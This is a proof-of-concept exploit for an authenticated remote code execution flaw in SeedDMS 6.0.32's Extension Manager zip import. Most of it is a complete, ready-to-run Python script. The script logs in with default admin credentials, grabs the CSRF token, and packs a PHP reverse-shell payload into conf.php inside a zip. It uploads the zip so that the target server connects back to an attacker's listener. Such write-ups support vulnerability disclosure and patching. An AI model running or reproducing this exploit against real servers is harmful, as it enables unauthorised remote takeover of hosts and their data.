PoC - Authenticated Remote Code Execution vulnerability in SeedDMS - v6.0.32

A vulnerability in SeedDMS 6.0.32 allows a privileged attacker to execute arbitrary PHP code by exploiting the zip import functionality in the Extension Manager

The attacker could potentially gain remote access to the hosting server by including a reverse shell payload in the conf.php file in the extensions zipped file. 

##############################Python PoC###############################

import requests
import re
import zipfile

# ASCII Banner
BANNER = r"""
   _____ ______ ______   __  __  _____ 
  /     |  ___ |  _  \ |  \/  |/     |
 |  (___| |___|| | | || .  . |  (___|
  \____ |  ___ | | | || |\/| |\____ |
       || |   || |/ / | |  | |     ||
  _____/|_|   |_|___| |_|  |_|_____|
  SEEDDMS RCE Exploit <=6.0.32
  Credits: Simon Njuguna
  CVE-2025-45752
"""

# Target Configuration
TARGET_URL = "http://192.168.58.1:800"  # Change as needed
LOGIN_URL = f"{TARGET_URL}/op/op.Login.php"
UPLOAD_URL = f"{TARGET_URL}/op/op.ExtensionMgr.php"
CSRF_URL = f"{TARGET_URL}/out/out.ExtensionMgr.php"

# Credentials
USERNAME = "admin"
PASSWORD = "admin"

# Reverse Shell Configuration
IP = "192.168.58.129"  # Attacker IP
PORT = 4444           # Listener port

# Session and Headers
SESSION = requests.Session()
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": CSRF_URL
}

def login():
    """Log into SeedDMS with admin credentials."""
    data = {
        "referuri": "/out/out.ViewFolder.php",
        "login": USERNAME,
        "pwd": PASSWORD,
        "lang": ""
    }
    response = SESSION.post(LOGIN_URL, data=data, headers=HEADERS)
    if "Logout" in response.text or "Dashboard" in response.text:
        print("[+] Login successful!")
        return True
    print(f"[-] Login failed! Response: {response.text[:200]}")
    return False

def get_csrf_token():
    """Retrieve CSRF token from the extensions page."""
    response = SESSION.get(CSRF_URL, headers=HEADERS)
    if response.status_code != 200:
        print(f"[-] Failed to fetch CSRF page! HTTP {response.status_code}")
        return None
    token_match = re.search(r'name="formtoken" value="([a-f0-9]{32})"', response.text)
    if token_match:
        csrf_token = token_match.group(1)
        print(f"[+] CSRF Token: {csrf_token}")
        return csrf_token
    print("[-] CSRF Token not found!")
    return None

def create_extension_zip():
    """Create a ZIP file with a PHP reverse shell."""
    payload = f"""<?php
$ip = "{IP}";
$port = {PORT};
exec("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"$ip\\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\"/bin/sh\\",\\"-i\\"])'");
?>"""
    with zipfile.ZipFile("exploit.zip", "w") as zipf:
        zipf.writestr("conf.php", payload)
    print("[+] Created exploit.zip with reverse shell.")

def upload_extension():
    """Upload the malicious ZIP as an extension."""
    csrf_token = get_csrf_token()
    if not csrf_token:
        print("[-] Aborting: No CSRF token!")
        return False

    files = {
        "userfile": ("exploit.zip", open("exploit.zip", "rb"), "application/x-zip-compressed")
    }
    data = {
        "formtoken": csrf_token,
        "action": "upload"
    }

    print("[*] Uploading exploit.zip...")
    print(f"[*] Reverse shell should connect NOW to {IP}:{PORT}...")
    try:
        SESSION.post(UPLOAD_URL, headers=HEADERS, files=files, data=data, timeout=5)
        print("[+] Upload sent! Shell should be active.")
        return True
    except requests.exceptions.Timeout:
        print("[*] Server timed out (expected due to shell execution).")
        print("[+] Upload sent! Shell should be active.")
        return True
    except requests.RequestException as e:
        print(f"[-] Upload error: {e}")
        return False

def main():
    print(BANNER)
    if not login():
        return
    create_extension_zip()
    if upload_extension():
        print(f"[+] Exploit completed successfully! Check your listener at {IP}:{PORT}")
    else:
        print("[-] Exploit failed. See above for details.")

if __name__ == "__main__":
    main()
